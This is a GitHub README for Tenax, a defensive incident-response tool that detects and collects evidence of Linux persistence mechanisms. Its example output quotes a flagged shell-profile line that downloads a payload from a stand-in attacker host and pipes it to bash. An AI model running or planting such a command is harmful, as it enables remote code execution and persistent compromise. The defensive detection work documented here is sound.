# Tenax

> Incident Response Tool/Playbook for Linux Systems

---

## 🚀 Download and Execution

```bash
git clone https://github.com/norminton/tenax.git
cd tenax
python tnx.py analyze
```

Recommended:

```bash
sudo python tnx.py analyze
sudo python tnx.py analyze --help
sudo python tnx.py collect --mode <mode>
sudo python tnx.py collect --help
```

---

## 🧠 What It Does

Tenax is a tool built to help **Incident Response analysts** collect, analyze, and investigate Linux systems.

The focus of this tool is detecting **persistence mechanisms** 

Place it onto the affected box, snapshot, or clone, then run both:

- `analyze`
- `collect`

These will:

- surface high-probability persistence
- score findings by severity
- explain *why* something is suspicious
- provide a **starting point** for investigation

I emphasize **starting point**! This is not, and will never be, a catch-all.

What it *does* do is dramatically reduce time-to-triage and give you immediate direction during an investigation.

---

If your team already has a collection/analysis workflow, Tenax still provides value.

I’ve included a detailed [Persistence Playbook](docs/README.md)

This documents every major persistence mechanism actively used by:
- APT groups
- red teams
- opportunistic attackers
  
And displays the locations to analyze/triage, as well as the methods to do so.  

---

## 🔎 Example Output (Analyze)

```text
=== CRITICAL FINDINGS (3) ===

====================================================================================================
[1] TX-UNSET | SHELL PROFILES | CRITICAL
Path: /home/nadmin/.bashrc
Score: 275
Primary Reason: Shell profile downloads and executes payload inline
Reasons:
  - Shell profile executes suspicious command
  - Shell profile downloads content from a remote URL
  - Shell profile downloads and executes payload inline
  - Shell profile combines download behavior with active execution logic
Preview: line 126: curl http://evil.test/payload.sh | bash

====================================================================================================
[2] TX-UNSET | ENVIRONMENT HOOKS | CRITICAL
Path: /home/nadmin/.bashrc
Score: 275
Primary Reason: Environment hook downloads and executes payload inline
Reasons:
  - Environment hook executes suspicious command
  - Environment hook downloads content from a remote URL
  - Environment hook downloads and executes payload inline
  - Environment hook combines download behavior with active execution logic
Preview: line 126: curl http://evil.test/payload.sh | bash
```

---

## 📊 Coverage

Tenax analyzes and collects across ALL major Linux persistence surfaces:

### Analyze Coverage

- Systemd services (`/etc/systemd`, `/lib/systemd`)
- Cron jobs (`/etc/crontab`, `/etc/cron.d`, `/var/spool/cron`)
- SSH (`authorized_keys`, ssh configs)
- PAM (`/etc/pam.d`)
- Shell profiles (`.bashrc`, `.profile`, `.zshrc`)
- Environment hooks (`/etc/profile`, `/etc/environment`)
- LD preload / library hijacking
- Network hooks (`/etc/network`, NetworkManager, ppp)
- Temporary execution paths (`/tmp`, `/dev/shm`)
- Sudoers configuration
- RC/init scripts
- Autostart entries
- Container persistence locations
- Linux capabilities abuse

Detection includes:
- command execution patterns
- download + execute chains
- encoded payload execution
- reverse shells
- path hijacking
- environment abuse
- privilege manipulation

---

### Collect Coverage

The `collect` command builds a structured evidence bundle including:

- file metadata (owner, perms, timestamps)
- SHA256 hashes
- parsed file content
- referenced file chaining (recursive)
- grouped artifacts by persistence surface
- clean output for investigation and reporting (TXT/JSON)

Collection modes:

| Mode       | Description |
|-----------|------------|
| inventory | Metadata only |
| parsed    | Includes parsed file content |
| evidence  | Copies artifacts + references |
| archive   | Full bundle + compressed `.tgz` |

---

## 📦 Output

Tenax outputs structured results into the `output/` directory:

```text
output/
└── collect_YYYYMMDD_HHMMSS/
    ├── manifest.json
    ├── summary.txt
    ├── references.json
    ├── errors.json
    ├── hashes.txt
    └── collected/
        ├── systemd/
        ├── cron/
        ├── ssh/
        └── ...
```

Key points:

- Artifacts are grouped by **persistence surface**
- References are recursively followed (where possible)
- Everything is preserved for **investigation and reporting**
- Output is designed to be readable without additional tooling

---

## 🧭 Repo Buildout

```text
tenax/
├── docs/
│   ├── modules/
│   │   ├── at-jobs.md
│   │   ├── autostart-hooks.md
│   │   ├── capabilities.md
│   │   ├── containers.md
│   │   ├── cron.md
│   │   ├── environment-hooks.md
│   │   ├── ld-preload.md
│   │   ├── network-hooks.md
│   │   ├── pam.md
│   │   ├── rc-init.md
│   │   ├── shell-profiles.md
│   │   ├── ssh.md
│   │   ├── sudoers.md
│   │   ├── systemd.md
│   │   └── tmp-paths.md
│   ├── README.md
│   ├── analyst-guide.md
│   ├── apt-tradecraft-notes.md
│   ├── attack-mapping.md
│   ├── false-positives.md
│   ├── methodology.md
│   └── triage-principles.md
├── output/
├── tenax/
│   ├── checks/
│   │   ├── __init__.py
│   │   ├── at_jobs.py
│   │   ├── autostart_hooks.py
│   │   ├── capabilities.py
│   │   ├── containers.py
│   │   ├── cron.py
│   │   ├── environment_hooks.py
│   │   ├── ld_preload.py
│   │   ├── network_hooks.py
│   │   ├── pam.py
│   │   ├── rc_init.py
│   │   ├── shell_profiles.py
│   │   ├── ssh.py
│   │   ├── sudoers.py
│   │   ├── systemd.py
│   │   └── tmp_paths.py
│   ├── __init__.py
│   ├── analyzer.py
│   ├── banner.py
│   ├── cli.py
│   ├── collector.py
│   ├── reporter.py
│   └── utils.py
├── tests/
│   ├── test_cron.py
│   ├── test_scoring.py
│   └── test_systemd.py
├── .gitignore
├── LICENSE
├── README.md
├── config.yaml
├── main.py
├── requirements.txt
└── setup.py
```
